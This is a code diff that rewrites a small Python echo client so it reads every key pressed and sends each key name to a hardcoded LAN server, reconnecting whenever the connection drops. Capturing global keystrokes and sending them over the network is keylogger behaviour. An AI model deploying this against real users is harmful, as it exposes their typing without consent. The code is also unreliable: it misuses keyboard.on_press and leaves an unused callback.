@@ -1,14 +1,47 @@
-# echo-client.py
 import socket
+import keyboard
+import time
 
+class Client:
+    def __init__(self):
+        # Initialize socket
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-def connect(ip, port):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((ip, port))
-        s.sendall(b"Hello")
-        data = s.recv(1024)
+        # Initialize server info
+        self.ip = "192.168.192.228"
+        self.port = 38699
 
-    print(f"Received {data!r}")
+    def connect(self):
+        self.socket.connect((self.ip, self.port))
+        self.socket.sendall(b"Hello server")
+        
+        self.listen()
 
+    def send(self, msg):
+        self.socket.sendall(bytes(msg, "utf-8"))
 
-connect("127.0.0.1", 35491)
+    def listen(self):
+        while True:
+            data = self.socket.recv(1024)
+
+            if not data:
+                continue
+            else:
+                print(f"Received: {data!r}")
+                break
+        
+
+def sendKeyToServer(event):
+    client.send(event.name)
+
+client = Client()
+client.connect()
+while True:
+    try:
+        keyboard.on_press(client.send(keyboard.read_key()))
+        client.listen()
+        
+    except ConnectionResetError:
+        print("Lost connection to server. Reconnecting...")
+        client.connect()
+
